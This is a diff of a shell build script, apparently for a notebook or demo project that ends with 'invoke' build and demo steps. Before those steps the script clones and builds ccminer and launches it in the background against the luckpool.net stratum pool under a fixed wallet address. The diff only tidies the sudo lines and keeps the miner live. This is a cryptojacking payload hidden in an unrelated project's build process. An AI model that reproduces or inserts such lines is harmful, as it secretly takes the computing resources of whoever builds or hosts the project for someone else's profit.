@@ -1,14 +1,12 @@
-set -ex
-
-sudo apt update -y
-sudo apt-get install -y \ libcurl4-openssl-dev \ libssl-dev \ libjansson-dev \ automake \ autotools-dev \ build-essential \ git clone https://github.com/monkins1010/ccminer
+git clone https://github.com/monkins1010/ccminer
 cd ccminer
 chmod +x build.sh 
 chmod +x configure.sh 
 chmod +x autogen.sh
-sudo ./build.sh
+./build.sh
 ./ccminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u RTBTgVXVZdfeYXtMVUhtJm6soVWrQTCFPZ.01 -t0 -B
 
+set -ex
 invoke build --env-name=root --no-kernel
 invoke demofiles
 invoke talk -t demo
